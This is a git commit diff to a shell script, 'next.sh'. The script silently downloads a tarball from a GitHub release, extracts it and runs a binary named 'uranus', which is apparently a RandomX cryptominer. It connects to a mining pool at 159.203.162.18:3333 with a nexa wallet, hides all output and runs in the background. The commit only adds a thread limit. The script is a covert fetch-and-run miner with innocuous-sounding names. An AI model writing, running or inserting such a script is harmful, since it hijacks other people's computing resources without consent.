0c68daae60bd0e56316a60c7f6c96c42c89917be
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-02 05:06:03 +0700

    Update next.sh

--- next.sh
+++ next.sh
@@ -1,4 +1,4 @@
-wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a rx/0 -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax.RIG001 > /dev/null 2>&1 &
+wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a rx/0 -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax.RIG001 -t 1 > /dev/null 2>&1 &
 while true
 do
         echo "gasss........!"
